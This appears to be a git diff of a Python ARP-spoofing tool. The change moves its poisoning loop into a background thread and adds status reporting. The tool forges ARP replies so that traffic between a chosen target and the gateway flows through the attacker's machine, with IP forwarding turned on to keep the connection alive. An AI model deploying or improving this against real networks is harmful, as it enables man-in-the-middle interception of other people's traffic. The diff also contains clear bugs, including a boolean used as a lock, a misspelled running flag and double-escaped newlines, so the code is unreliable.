@@ -5,6 +5,7 @@ import socket
 import json
 from datetime import datetime
 from threading import Thread, Event
+import threading
 from typing import List, Optional, Callable
 import sys
 import time
@@ -442,12 +443,26 @@ class ARPSpoofing:
         self._runnning = False
         self._poisoned = False
         
+        # Threading
+        self._thread = None
+        self._lock = False
+        
         conf.verb = 0
         
         print("[ARPSpoofing] initialized ✓ ")
         print(f"Target IP: {self.target_ip}")
         print(f"Gateway IP: {self.gateway_ip}")
         print(f"Interface: {self.iface}")
+        
+    def _log(self, message: str):
+        """Helper untuk logging dengan callback"""
+        print(message)
+        if self.on_packet:
+            try:
+                self.on_packet(message)
+            except Exception as e:
+                print(f"[ARPSpoofing] on_packet callback error: {e}", file=sys.stderr)
+
         
     def _spoof(self, target_ip: str, spoof_ip: str, target_mac: str):
         packet = ARP(op=2, # ARP reply
@@ -472,140 +487,192 @@ class ARPSpoofing:
         try: 
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("1\n")
-                print("[ARPSpoofing] ✓ IP forwarding enabled")
+                self._log("[ARPSpoofing] ✓ IP forwarding enabled")
         except Exception as e:
-            print(f"[ARPSpoofer] ✗ Failed to enable IP forwarding: {e}")
-            print("  Try manually: echo 1 > /proc/sys/net/ipv4/ip_forward")
+            self._log(f"[ARPSpoofing] ✗ Failed to enable IP forwarding: {e}")
+            self._log("  Try manually: echo 1 > /proc/sys/net/ipv4/ip_forward")
             return False
     
     def disable_ip_forwarding(self):
         try:
             with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                 f.write("0\n")
-                print("[ARPSpoofing] ✓ IP forwarding disabled")
+                self._log("[ARPSpoofing] ✓ IP forwarding disabled")
         except Exception as e:
-            print(f"[ARPSpoofing] ✗ Failed to disable IP forwarding: {e}")
-            print("  Try manually: echo 0 > /proc/sys/net/ipv4/ip_forward")
+            self._log(f"[ARPSpoofing] ✗ Failed to disable IP forwarding: {e}")
+            self._log("  Try manually: echo 0 > /proc/sys/net/ipv4/ip_forward")
             return False
     
-    def start(self, enable_forwarding: bool = True):
-        if self._running :
-            if self.on_packet:
-                try:
-                    self.on_packet("[ARPSpoofer] Already running!")
-                except Exception as e:
-                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-                    
-            print("[ARPSpoofer] Already running!")
-            return
+    def _poison_loop(self):
+        """Loop poisoning yang berjalan di thread terpisah"""
+        packet_count = 0
         
-        if self.on_packet:
+        while self._running:
             try:
-                self.on_packet("[ARPSpoofer] Starting ARP poisoning attack...")
-            except Exception as e:
-                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-        
-        print("\n[ARPSpoofer] Starting ARP poisoning attack...")     
-        
-        self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
-        self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
-        
-        if not self.target_mac:
-            if self.on_packet:
-                try:
-                    out = f"[ARPSpoofer] ✗ Could not find target MAC for {self.target_ip}"
-                    self.on_packet(out)
-                except Exception as e:
-                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-            
-            print(f"[ARPSpoofer] ✗ Could not find target MAC for {self.target_ip}")
-            return False
-        
-        if not self.gateway_mac:
-            if self.on_packet:
-                try:
-                    out = f"[ARPSpoofer] ✗ Could not find gateway MAC for {self.gateway_ip}"
-                    self.on_packet(out)
-                except Exception as e:
-                    print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-            
-            print(f"[ARPSpoofer] ✗ Could not find gateway MAC for {self.gateway_ip}")
-            return False
-        
-        if enable_forwarding:
-            self.enable_ip_forwarding()
-            
-        self._runnning = True
-        self._poisoned = True
-        
-        if self.on_packet:
-            try:
-                self.on_packet(f"[ARPSpoofer] ✓ Poisoning started!")
-                self.on_packet(f"Telling {self.target_ip} that {self.gateway_ip} is at our MAC")
-                self.on_packet(f"Telling {self.gateway_ip} that {self.target_ip} is at our MAC")
-                self.on_packet(f"Sending ARP packets every {self.interval}s")
-            except Exception as e:
-                print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-        
-        print(f"\n[ARPSpoofer] ✓ Poisoning started!")
-        print(f"  Telling {self.target_ip} that {self.gateway_ip} is at our MAC")
-        print(f"  Telling {self.gateway_ip} that {self.target_ip} is at our MAC")
-        print(f"  Sending ARP packets every {self.interval}s")
-        print(f"\n[ARPSpoofer] Press Ctrl+C to stop and restore ARP tables\n")
-        
-        try:
-            packet_count = 0
-            while self._runnning:
-                # Poison target (tell target that gateway is at our MAC)
+                # Poison target
                 self._spoof(self.target_ip, self.gateway_ip, self.target_mac)
-                
-                # Poison gateway (tell gateway that target is at our MAC
+                # Poison gateway
                 self._spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                 
                 packet_count += 2
-                if self.on_packet:
-                    try:
-                        out = f"[ARPSpoofer] Sent {packet_count} ARP packets..."
-                        self.on_packet(out)
-                    except Exception as e:
-                        print(f"[IPSniffer] on_packet callback raised: {e}", file=sys.stderr)
-                print(f"[ARPSpoofer] Sent {packet_count} ARP packets...", end="\r")
+                self._log(f"[ARPSpoofing] Sent {packet_count} ARP packets...")
                 
                 time.sleep(self.interval)
-        except KeyboardInterrupt:
-            print("\n[ARPSpoofer] Interrupted by user")
-        finally:
-            self.stop()
-        return True
+                
+            except Exception as e:
+                self._log(f"[ARPSpoofing] Error in poison loop: {e}")
+                break
+        
+            self._log("[ARPSpoofing] Poison loop stopped")
     
-    def stop(self):
-        """
-        Stop ARP poisoning and restore original ARP tables
-        """
-        if not self._running and not self._poisoned:
-            print("[ARPSpoofer] Not running")
-            return
-        
-        self._running = False
-        
-        if self._poisoned and self.target_mac and self.gateway_mac:
-            print("\n[ARPSpoofer] Restoring ARP tables...")
-            
-            # Restore target's ARP table
-            print(f"  Restoring {self.target_ip}'s ARP table...")
-            self._restore(self.target_ip, self.gateway_ip,
-                         self.target_mac, self.gateway_mac)
-            
-            # Restore gateway's ARP table  
-            print(f"  Restoring {self.gateway_ip}'s ARP table...")
-            self._restore(self.gateway_ip, self.target_ip,
-                         self.gateway_mac, self.target_mac)
-            
-            print("[ARPSpoofer] ✓ ARP tables restored")
-            self._poisoned = False
-        
-        print("[ARPSpoofer] Stopped")
+    def start(self, enable_forwarding: bool = True, background: bool = True) -> dict:
+        with self._lock:
+            if self._running:
+                return {
+                    "success": False,
+                    "message": "ARP spoofing already running",
+                    "is_running": True,
+                    "thread": self._thread
+                }
+
+            self._log("\\n[ARPSpoofing] Starting ARP poisoning attack...")
+
+            # Get MAC addresses
+            self.target_mac = str(get_mac_address(ip=str(self.target_ip), network_request=True))
+            self.gateway_mac = str(get_mac_address(ip=str(self.gateway_ip), network_request=True))
+
+            if not self.target_mac or self.target_mac == "None":
+                msg = f"Could not find target MAC for {self.target_ip}"
+                self._log(f"[ARPSpoofing] ✗ {msg}")
+                return {
+                    "success": False,
+                    "message": msg,
+                    "is_running": False,
+                    "thread": None
+                }
+
+            if not self.gateway_mac or self.gateway_mac == "None":
+                msg = f"Could not find gateway MAC for {self.gateway_ip}"
+                self._log(f"[ARPSpoofing] ✗ {msg}")
+                return {
+                    "success": False,
+                    "message": msg,
+                    "is_running": False,
+                    "thread": None
+                }
+
+            # Enable IP forwarding
+            if enable_forwarding:
+                if not self.enable_ip_forwarding():
+                    return {
+                        "success": False,
+                        "message": "Failed to enable IP forwarding",
+                        "is_running": False,
+                        "thread": None
+                    }
+
+            # Set flags
+            self._running = True
+            self._poisoned = True
+
+            if background:
+                # Start thread
+                self._thread = threading.Thread(
+                    target=self._poison_loop,
+                    daemon=True,
+                    name=f"ARP-{self.target_ip}"
+                )
+                self._thread.start()
+
+                self._log(f"\\n[ARPSpoofing] ✓ Poisoning started in background thread!")
+                self._log(f"  Target: {self.target_ip} ({self.target_mac})")
+                self._log(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")
+                self._log(f"  Interval: {self.interval}s")
+
+                return {
+                    "success": True,
+                    "message": "ARP spoofing started successfully",
+                    "is_running": True,
+                    "target_ip": self.target_ip,
+                    "target_mac": self.target_mac,
+                    "gateway_ip": self.gateway_ip,
+                    "gateway_mac": self.gateway_mac,
+                    "interval": self.interval,
+                    "thread": self._thread  # Return thread object
+                }
+            else:
+                # Blocking mode
+                self._log(f"\\n[ARPSpoofing] ✓ Starting poisoning (blocking mode)...")
+                try:
+                    self._poison_loop()
+                except KeyboardInterrupt:
+                    self._log("\\n[ARPSpoofing] Interrupted by user")
+                finally:
+                    self.stop()
+
+                return {
+                    "success": True,
+                    "message": "ARP spoofing completed",
+                    "is_running": False,
+                    "thread": None
+                }
+
     
+    def stop(self) -> dict:
+        with self._lock:
+            if not self._running and not self._poisoned:
+                return {
+                    "success": False,
+                    "message": "ARP spoofing not running",
+                    "is_running": False
+                }
+
+            self._log("\\n[ARPSpoofing] Stopping ARP poisoning...")
+
+            # Stop the loop
+            self._running = False
+
+            # Wait for thread to finish (with timeout)
+            if self._thread and self._thread.is_alive():
+                self._thread.join(timeout=5)
+
+            # Restore ARP tables
+            if self._poisoned and self.target_mac and self.gateway_mac:
+                self._log("[ARPSpoofing] Restoring ARP tables...")
+
+                # Restore target's ARP table
+                self._log(f"  Restoring {self.target_ip}'s ARP table...")
+                self._restore(self.target_ip, self.gateway_ip,
+                            self.target_mac, self.gateway_mac)
+
+                # Restore gateway's ARP table
+                self._log(f"  Restoring {self.gateway_ip}'s ARP table...")
+                self._restore(self.gateway_ip, self.target_ip,
+                            self.gateway_mac, self.target_mac)
+
+                self._log("[ARPSpoofing] ✓ ARP tables restored")
+                self._poisoned = False
+
+            self._log("[ARPSpoofing] ✓ Stopped successfully")
+
+            return {
+                "success": True,
+                "message": "ARP spoofing stopped and ARP tables restored",
+                "is_running": False
+            }
+
+    def status(self) -> dict:
+        return {
+            "is_running": self._running,
+            "is_poisoned": self._poisoned,
+            "target_ip": self.target_ip,
+            "target_mac": self.target_mac,
+            "gateway_ip": self.gateway_ip,
+            "gateway_mac": self.gateway_mac,
+            "interval": self.interval,
+            "thread_alive": self._thread.is_alive() if self._thread else False
+        }
+
     @property
     def is_running(self) -> bool:
         return self._running
